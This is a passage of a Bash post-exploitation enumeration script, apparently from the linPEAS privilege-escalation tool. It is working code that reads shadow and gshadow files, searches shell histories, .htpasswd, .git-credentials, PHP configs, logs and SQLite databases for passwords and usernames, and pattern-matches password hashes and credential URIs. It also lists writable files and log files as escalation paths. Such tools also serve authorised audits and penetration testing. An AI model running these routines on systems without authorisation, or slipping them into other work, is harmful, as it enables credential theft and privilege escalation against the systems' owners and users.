  ((getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr 2>/dev/null) || echo_not_found "files with acls in searched folders" ) | sed "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;31m&${C}[0m,"
  echo ""
  
  ##-- 6IF) .sh files in PATH
  printf $Y"[+] "$GREEN".sh files in path\n"$NC
  for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null | sed "s,$pathshG,${C}[1;32m&${C}[0m," ; done
  echo ""

  ##-- 7IF) Unexpected folders in /
  printf $Y"[+] "$GREEN"Unexpected folders in root\n"$NC
  (find / -maxdepth 1 -type d | grep -v "$commonrootdirsG" | sed "s,.*,${C}[1;31m&${C}[0m,") || echo_not_found
  echo ""

  ##-- 8IF) Files (scripts) in /etc/profile.d/
  printf $Y"[+] "$GREEN"Files (scripts) in /etc/profile.d/\n"$NC
  (ls -la /etc/profile.d/ | sed "s,$profiledG,${C}[1;32m&${C}[0m,") || echo_not_found "/etc/profile.d/"
  echo ""

  ##-- 9IF) Hashes in passwd file
  printf $Y"[+] "$GREEN"Hashes inside passwd file? ........... "$NC
  if [ "`grep -v '^[^:]*:[x\*]' /etc/passwd 2>/dev/null`" ]; then grep -v '^[^:]*:[x\*]' /etc/passwd 2>/dev/null | sed "s,.*,${C}[1;31m&${C}[0m,"
  else echo_no
  fi

  ##-- 10IF) Hashes in group file
  printf $Y"[+] "$GREEN"Hashes inside group file? ............ "$NC
  if [ "`grep -v "^[^:]*:[x]" /etc/group 2>/dev/null`" ]; then grep -v "^[^:]*:[x]" /etc/group 2>/dev/null | sed "s,.*,${C}[1;31m&${C}[0m,"
  else echo_no
  fi

  ##-- 11IF) Credentials in fstab
  printf $Y"[+] "$GREEN"Credentials in fstab/mtab? ........... "$NC
  if [ "`grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null`" ]; then grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null | sed "s,.*,${C}[1;31m&${C}[0m,"
  else echo_no
  fi

  ##-- 12IF) Read shadow files
  printf $Y"[+] "$GREEN"Can I read shadow files? ............. "$NC
  if [ "`cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd 2>/dev/null`" ]; then cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/master.passwd 2>/dev/null | sed "s,.*,${C}[1;31m&${C}[0m,"
  else echo_no
  fi

  ##-- 13IF) Read root dir
  printf $Y"[+] "$GREEN"Can I read root folder? .............. "$NC
  (ls -al /root/ 2>/dev/null) || echo_no
  echo ""

  ##-- 14IF) Root files in home dirs
  printf $Y"[+] "$GREEN"Searching root files in home dirs (limit 20)\n"$NC
  (find /home -user root 2>/dev/null | head -n 20 | sed "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$USER,${C}[1;31m&${C}[0m,") || echo_not_found
  echo ""

  ##-- 15IF) Others files in my dirs
  if ! [ "$IAMROOT" ]; then
    printf $Y"[+] "$GREEN"Searching others files in folders owned by me\n"$NC
    (for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $USER 2>/dev/null`; do find $d ! -user \`whoami\` -exec ls -l {} \; 2>/dev/null | sed "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed "s,$knw_usrs,${C}[1;32m&${C}[0m,g" | sed "s,$USER,${C}[1;95m&${C}[0m,g" | sed "s,root,${C}[1;13m&${C}[0m,g"; done) || echo_not_found
    echo ""
  fi

  ##-- 16IF) Readable files belonging to root and not world readable
  if ! [ "$IAMROOT" ]; then
    printf $Y"[+] "$GREEN"Readable files belonging to root and readable by me but not world readable\n"$NC
    (for f in `find / -type f -user root ! -perm -o=r 2>/dev/null | grep -v "\.journal"`; do if [ -r $f ]; then ls -l $f 2>/dev/null | sed "s,.*,${C}[1;31m&${C}[0m,"; fi; done) || echo_not_found
    echo ""
  fi
  
  ##-- 17IF) Modified interesting files into specific folders in the last 5mins 
  printf $Y"[+] "$GREEN"Modified interesting files in the last 5mins (limit 100)\n"$NC
  find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null | head -n 100 | sed "s,$Wfolders,${C}[1;31m&${C}[0m,"
  echo ""

  ##-- 18IF) Writable log files
  printf $Y"[+] "$GREEN"Writable log files (logrotten) (limit 100)\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation\n"$NC
  for log in $(find / -type f -name "*.log" -o -name "*.log.*" 2>/dev/null | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (cont < 3){ print line_init; }; if (cont == "3"){print "#)You_can_write_more_log_files_inside_last_directory"}; if (act == pre){(cont += 1)} else {cont=0}; pre=act}' | head -n 100 ); do
    if [ `echo "$log" | grep "You_can_write_more_log_files_inside_last_directory"` ]; then printf $ITALIC"$log\n"$NC;
    elif [ -w "$log" ]; then printf "Writable:$RED $log\n"$NC;
    elif [ `echo "$log" | grep "$Wfolders"` ]; then echo "Writable folder: $log" | sed "s,$Wfolders,${C}[1;31m&${C}[0m,";
    fi
  done

  echo ""

  ##-- 19IF) Files inside my home
  printf $Y"[+] "$GREEN"Files inside $HOME (limit 20)\n"$NC
  (ls -la $HOME 2>/dev/null | head -n 23) || echo_not_found
  echo ""

  ##-- 20IF) Files inside /home
  printf $Y"[+] "$GREEN"Files inside others home (limit 20)\n"$NC
  (find /home -type f 2>/dev/null | grep -v -i "/"$USER | head -n 20) || echo_not_found
  echo ""

  ##-- 21IF) Mail applications
  printf $Y"[+] "$GREEN"Searching installed mail applications\n"$NC
  ls /bin /sbin /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin /etc | grep -wi $mail_apps
  echo ""

  ##-- 22IF) Mails
  printf $Y"[+] "$GREEN"Mails (limit 50)\n"$NC
  (find /var/mail/ /var/spool/mail/ -type f 2>/dev/null | head -n 50) || echo_not_found
  echo ""

  ##-- 23IF) Backup files
  printf $Y"[+] "$GREEN"Backup files?\n"$NC
  backs=`find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bak\.*" -o -name "*\.bck" -o -name "*\.bck\.*" -o -name "*\.bk" -o -name "*\.bk\.*" -o -name "*\.old" -o -name "*\.old\.*" \) 2>/dev/null` 
  for b in $backs; do if [ -r $b ]; then ls -l "$b" | grep -v $notBackup | sed "s,backup\|bck\|\.bak\|\.old,${C}[1;31m&${C}[0m,g"; fi; done
  echo ""

  ##-- 24IF) DB files
  printf $Y"[+] "$GREEN"Searching tables inside readable .db/.sqlite files (limit 100)\n"$NC
  dbfiles=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_OPT" | grep -E '.*\.db$|.*\.sqlite$|.*\.sqlite3$' | grep -E -v '/man/.*|/usr/.*|/var/cache/.*' | head -n 100)
  if [ "$dbfiles" ]; then
    SQLITEPYTHON=""
    for f in $dbfiles; do 
      if [ -r $f ]; then 
        printf $GREEN" -> Extracting tables from$NC $f $DG(limit 20)\n"$NC
        if [ "`which sqlite3 2>/dev/null`" ]; then
          tables=`sqlite3 $f ".tables" 2>/dev/null`
          #printf "$tables\n" | sed "s,user.*\|credential.*,${C}[1;31m&${C}[0m,g"
        elif [ "`which python 2>/dev/null`" ] || [ "`which python3 2>/dev/null`" ]; then
          SQLITEPYTHON=`which python 2>/dev/null || which python3 2>/dev/null`
          tables=`$SQLITEPYTHON -c "print('\n'.join([t[0] for t in __import__('sqlite3').connect('$f').cursor().execute('SELECT name FROM sqlite_master WHERE type=\'table\' and tbl_name NOT like \'sqlite_%\';').fetchall()]))" 2>/dev/null`
          #printf "$tables\n" | sed "s,user.*\|credential.*,${C}[1;31m&${C}[0m,g"
        else
          tables=""
        fi
        if [ "$tables" ]; then
          for t in $tables; do
            columns=""
            # Search for credentials inside the table using sqlite3
            if [ -z "$SQLITEPYTHON" ]; then
              columns=`sqlite3 $f ".schema $t" 2>/dev/null | grep "CREATE TABLE"`
            # Search for credentials inside the table using python
            else
              columns=`$SQLITEPYTHON -c "print(__import__('sqlite3').connect('$f').cursor().execute('SELECT sql FROM sqlite_master WHERE type!=\'meta\' AND sql NOT NULL AND name =\'$t\';').fetchall()[0][0])" 2>/dev/null`
            fi
            #Check found columns for interesting fields
            INTCOLUMN=`echo "$columns" | grep -i "username\|passw\|credential\|email\|hash\|salt"`
            if [ "$INTCOLUMN" ]; then
              printf $B"  --> Found interesting column names in$NC $t $DG(output limit 10)\n"$NC | sed "s,user.*\|credential.*,${C}[1;31m&${C}[0m,g"
              printf "$columns\n" | sed "s,username\|passw\|credential\|email\|hash\|salt\|$t,${C}[1;31m&${C}[0m,g"
              (sqlite3 $f "select * from $t" || $SQLITEPYTHON -c "print(', '.join([str(x) for x in __import__('sqlite3').connect('$f').cursor().execute('SELECT * FROM \'$t\';').fetchall()[0]]))") 2>/dev/null | head
            fi
          done
          echo ""
        fi
      fi
    done
  fi
  echo ""

  ##-- 25IF) Web files
  printf $Y"[+] "$GREEN"Web files?(output limit)\n"$NC
  ls -alhR /var/www/ 2>/dev/null | head
  ls -alhR /srv/www/htdocs/ 2>/dev/null | head
  ls -alhR /usr/local/www/apache22/data/ 2>/dev/null | head
  ls -alhR /opt/lampp/htdocs/ 2>/dev/null | head
  echo ""

  ##-- 26IF) Interesting files
  printf $Y"[+] "$GREEN"Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data\n"$NC
  fils=$(echo "$FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_USR $FIND_OPT $FIND_MNT $FIND_VAR" | grep -E '.*_history|\.sudo_as_admin_successful|\.profile|.*bashrc|.*httpd\.conf|.*\.plan|\.htpasswd|\.gitconfig|\.git-credentials|\.git|\.svn|\.rhosts|hosts\.equiv|Dockerfile|docker-compose\.yml')
  for f in $fils; do 
    if [ -r $f ]; then 
      ls -ld "$f" 2>/dev/null | sed "s,_history\|\.sudo_as_admin_successful\|.profile\|bashrc\|httpd.conf\|\.plan\|\.htpasswd\|.gitconfig\|\.git-credentials\|.git\|.svn\|\.rhosts\|hosts.equiv\|Dockerfile\|docker-compose.yml,${C}[1;31m&${C}[0m," | sed "s,$sh_usrs,${C}[1;96m&${C}[0m,g" | sed "s,$USER,${C}[1;95m&${C}[0m,g" | sed "s,root,${C}[1;31m&${C}[0m,g"; 
      if [ `echo $f | grep "_history"` ]; then
        printf $GREEN"Searching possible passwords inside $f (limit 100)\n"$NC
        cat "$f" | grep $pwd_inside_history | sed '/^.\{150\}./d' | sed "s,$pwd_inside_history,${C}[1;31m&${C}[0m," | head -n 100
        echo ""
      elif [ `echo $f | grep "httpd.conf" ` ]; then
        printf $GREEN"Reading $f\n"$NC
        cat "$f" | grep -v "^#" | grep -Pv "\W*\#" | grep -v "^$" | sed "s,htaccess.*\|htpasswd.*,${C}[1;31m&${C}[0m,"
        echo ""
      elif [ `echo $f | grep "htpasswd" ` ]; then
        printf $GREEN"Reading $f\n"$NC
        cat "$f" | sed "s,.*,${C}[1;31m&${C}[0m,"
        echo ""
      fi;
    fi; 
  done
  echo ""

  ##-- 27IF) All hidden files
  printf $Y"[+] "$GREEN"All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)\n"$NC
  find / -type f -iname ".*" ! -path "/sys/*" -exec ls -l {} \; 2>/dev/null | grep -v "_history$\|.sudo_as_admin_successful\|\.profile\|\.bashrc\|\.plan\|\.htpasswd\|.gitconfig\|\.git-credentials\|\.rhosts\|\.gitignore\|.npmignore\|\.listing\|\.ignore\|\.uuid\|.depend\|.placeholder\|.gitkeep\|.keep" | head -n 70
  echo ""

  ##-- 28IF) Readable files in /tmp, /var/tmp, /var/backups
  printf $Y"[+] "$GREEN"Readable files inside /tmp, /var/tmp, /var/backups(limit 70)\n"$NC
  filstmpback=`find /tmp /var/tmp /var/backups -type f 2>/dev/null | head -n 70`
  for f in $filstmpback; do if [ -r "$f" ]; then ls -l "$f" 2>/dev/null; fi; done
  echo ""

  ##-- 29IF) Interesting writable files by ownership or all
  if ! [ "$IAMROOT" ]; then
    printf $Y"[+] "$GREEN"Interesting writable files owned by me or writable by everyone (not in Home) (max 500)\n"$NC
    printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files\n"$NC
    #In the next file, you need to specify type "d" and "f" to avoid fake link files apparently writable by all
    for entry in `find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null | grep -v $notExtensions | sort | uniq | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (cont < 10){ print line_init; } if (cont == "10"){print "#)You_can_write_even_more_files_inside_last_directory"}; if (act == pre){(cont += 1)} else {cont=0}; pre=act }' | head -n500`; do
      if [ `echo "$entry" | grep "You_can_write_even_more_files_inside_last_directory"` ]; then printf $ITALIC"$entry\n"$NC;
      elif [ `echo $entry | grep "$writeVB"` ]; then 
        echo $entry | sed "s,$writeVB,${C}[1;31;103m&${C}[0m,"
      else
        echo $entry | sed "s,$writeB,${C}[1;31m&${C}[0m,"
      fi
    done
    echo ""
  fi

  ##-- 30IF) Interesting writable files by group
  if ! [ "$IAMROOT" ]; then
    printf $Y"[+] "$GREEN"Interesting GROUP writable files (not in Home) (max 500)\n"$NC
    printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files\n"$NC
    for g in `groups`; 
      do printf "  Group "$GREEN"$g:\n"$NC; 
      for entry in `find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null | grep -v $notExtensions | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (cont < 10){ print line_init; } if (cont == "10"){print "#)You_can_write_even_more_files_inside_last_directory"}; if (act == pre){(cont += 1)} else {cont=0}; pre=act }' | head -n500`; do
        if [ `echo "$entry" | grep "You_can_write_even_more_files_inside_last_directory"` ]; then printf $ITALIC"$entry\n"$NC;
        elif [ `echo $entry | grep "$writeVB"` ]; then 
          echo $entry | sed "s,$writeVB,${C}[1;31;103m&${C}[0m,"
        else
          echo $entry | sed "s,$writeB,${C}[1;31m&${C}[0m,"
        fi
      done
    done
    echo ""
  fi

  ##-- 31IF) Passwords in config PHP files
  printf $Y"[+] "$GREEN"Searching passwords in config PHP files\n"$NC
  configs=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_USR $FIND_OPT" | grep -E '.*config.*\.php')
  for c in $configs; do grep -i "password.* = ['\"]\|define.*passw\|db_pass" $c 2>/dev/null | grep -v "function\|password.* = \"\"\|password.* = ''" | sed '/^.\{150\}./d' | sort | uniq | sed "s,password\|db_pass,${C}[1;31m&${C}[0m,i"; done
  echo ""

  ##-- 32IF) IPs inside logs
  printf $Y"[+] "$GREEN"Finding IPs inside logs (limit 70)\n"$NC
  (timeout 100 grep -R -a -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" /var/log/) 2>/dev/null | grep -v "\.0\.\|:0\|\.0$" | sort | uniq -c | sort -r -n | head -n 70
  echo ""

  ##-- 33IF) Passwords inside logs
  printf $Y"[+] "$GREEN"Finding passwords inside logs (limit 70)\n"$NC
  grep -R -i "pwd\|passw" /var/log/ 2>/dev/null | sed '/^.\{150\}./d' | sort | uniq | grep -v "File does not exist:\|script not found or unable to stat:\|\"GET /.*\" 404" | head -n 70 | sed "s,pwd\|passw,${C}[1;31m&${C}[0m,"
  echo ""

  ##-- 34IF) Emails inside logs
  printf $Y"[+] "$GREEN"Finding emails inside logs (limit 70)\n"$NC
  grep -I -R -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" /var/log/ 2>/dev/null | sort | uniq -c | sort -r -n | head -n 70 | sed "s,$knw_emails,${C}[1;32m&${C}[0m,g"
  echo "" 

  ##-- 35IF) Passwords files in home
  printf $Y"[+] "$GREEN"Finding *password* or *credential* files in home (limit 70)\n"$NC
  (echo "$FIND_HOME $FIND_ROOT" | grep -E '.*password.*|.*credential.*|creds.*' | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (cont < 3){ print line_init; } if (cont == "3"){print "  There are more creds/passwds files in the previous parent folder"}; if (act == pre){(cont += 1)} else {cont=0}; pre=act }' | head -n 70 | sed "s,password\|credential,${C}[1;31m&${C}[0m," | sed "s,There are more creds/passwds files in the previous parent folder,${C}[1;32m&${C}[0m,") || echo_not_found
  echo ""

  if ! [ "$SUPERFAST" ] && [ "$TIMEOUT" ]; then
    ##-- 36IF) Find possible files with passwords
    printf $Y"[+] "$GREEN"Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)\n"$NC
    timeout 100 grep -RiIE "(pwd|passwd|password).*[=:].+|define ?\('(\w*passw|\w*user|\w*datab)" /home /var/www /var/backups /tmp /etc /root /mnt 2>/dev/null | sed '/^.\{150\}./d' | grep -v "#" | sort | uniq | head -n 70 | sed "s,pwd\|passw\|define,${C}[1;31m&${C}[0m,gI"
    echo ""

    ##-- 37IF) Find possible files with passwords
    printf $Y"[+] "$GREEN"Finding possible password variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)\n"$NC
    timeout 100 grep -RiIE "($pwd_in_variables).*[=:].+" /home /var/www /var/backups /tmp /etc /root /mnt 2>/dev/null | sed '/^.\{150\}./d' | grep -v "#" | sort | uniq | head -n 70 | sed -E "s,$pwd_in_variables,${C}[1;31m&${C}[0m,gI"
    echo ""

    ##-- 38IF) Find possible files with usernames
    printf $Y"[+] "$GREEN"Finding 'username' string inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)\n"$NC
    timeout 100 grep -RiIE "username.*[=:].+" /home /var/www /var/backups /tmp /etc /root /mnt 2>/dev/null | sed '/^.\{150\}./d' | grep -v "#" | sort | uniq | head -n 70 | sed "s,username,${C}[1;31m&${C}[0m,gI"
    echo ""

    ##-- 39IF) Specific hashes inside files
    printf $Y"[+] "$GREEN"Searching specific hashes inside files - less false positives (limit 70)\n"$NC
    regexblowfish='\$2[abxyz]?\$[0-9]{2}\$[a-zA-Z0-9_/\.]*'
    regexjoomlavbulletin='[0-9a-zA-Z]{32}:[a-zA-Z0-9_]{16,32}'
    regexphpbb3='\$H\$[a-zA-Z0-9_/\.]{31}'
    regexwp='\$P\$[a-zA-Z0-9_/\.]{31}'
    regexdrupal='\$S\$[a-zA-Z0-9_/\.]{52}'
    regexlinuxmd5='\$1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}'
    regexapr1md5='\$apr1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}'
    regexsha512crypt='\$6\$[a-zA-Z0-9_/\.]{16}\$[a-zA-Z0-9_/\.]{86}'
    regexapachesha='\{SHA\}[0-9a-zA-Z/_=]{10,}'
    timeout 100 grep -RIEHo "$regexblowfish|$regexjoomlavbulletin|$regexphpbb3|$regexwp|$regexdrupal|$regexlinuxmd5|$regexapr1md5|$regexsha512crypt|$regexapachesha" /etc /var/backups /tmp /var/tmp /var/www /root /home /mnt 2>/dev/null | grep -v "/.git/\|/sources/authors/" | grep -v $notExtensions | grep -Ev "0{20,}" | awk -F: '{if (pre != $1){ print $0; }; pre=$1}' | head -n 70 | sed "s,:.*,${C}[1;31m&${C}[0m,"
    echo ""
  fi

  if ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && [ "$TIMEOUT" ]; then
    ##-- 40IF) Specific hashes inside files
    printf $Y"[+] "$GREEN"Searching md5/sha1/sha256/sha512 hashes inside files (limit 50)\n"$NC
    regexmd5='(^|[^a-zA-Z0-9])[a-fA-F0-9]{32}([^a-zA-Z0-9]|$)'
    regexsha1='(^|[^a-zA-Z0-9])[a-fA-F0-9]{40}([^a-zA-Z0-9]|$)'
    regexsha256='(^|[^a-zA-Z0-9])[a-fA-F0-9]{64}([^a-zA-Z0-9]|$)'
    regexsha512='(^|[^a-zA-Z0-9])[a-fA-F0-9]{128}([^a-zA-Z0-9]|$)'
    timeout 200 grep -RIEHo "$regexmd5|$regexsha1|$regexsha256|$regexsha512" /etc /var/backups /tmp /var/tmp /var/www /root /home /mnt 2>/dev/null | grep -v "/.git/\|/sources/authors/" | grep -v $notExtensions | grep -Ev "0{20,}" | awk -F: '{if (pre != $1){ print $0; }; pre=$1}' | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (cont < 2){ print line_init; } if (cont == "2"){print "  There are more hashes files in the previous parent folder"}; if (act == pre){(cont += 1)} else {cont=0}; pre=act }' | head -n 50 | sed "s,:.*,${C}[1;31m&${C}[0m," | sed "s,There are more hashes files in the previous parent folder,${C}[1;32m&${C}[0m,"
    echo ""
  fi
  
  if ! [ "$SUPERFAST" ] && ! [ "$FAST" ]; then
    ##-- 41IF) Find URIs with user:password@hoststrings
    printf $Y"[+] "$GREEN"Finding URIs with user:password@host inside /home /var/www /var/backups /tmp /etc /root /mnt\n"$NC
    timeout 200 grep -RiIE "://(.+):(.+)@" /var/www /var/backups /tmp /etc 2>/dev/null | sed '/^.\{150\}./d' | grep -v "#" | sort | uniq | sed -E "s,:\/\/(.+):(.+)@,://${C}[1;31m\1:\2${C}[0m@,gI"
    timeout 200 grep -RiIE "://(.+):(.+)@" /home 2>/dev/null | sed '/^.\{150\}./d' | grep -v "#" | sort | uniq | sed -E "s,:\/\/(.+):(.+)@,://${C}[1;31m\1:\2${C}[0m@,gI"
    timeout 200 grep -RiIE "://(.+):(.+)@" /mnt 2>/dev/null | sed '/^.\{150\}./d' | grep -v "#" | sort | uniq | sed -E "s,:\/\/(.+):(.+)@,://${C}[1;31m\1:\2${C}[0m@,gI"
    timeout 200 grep -RiIE "://(.+):(.+)@" /root 2>/dev/null | sed '/^.\{150\}./d' | grep -v "#" | sort | uniq | sed -E "s,:\/\/(.+):(.+)@,://${C}[1;31m\1:\2${C}[0m@,gI"
    echo  ""
  fi
fi
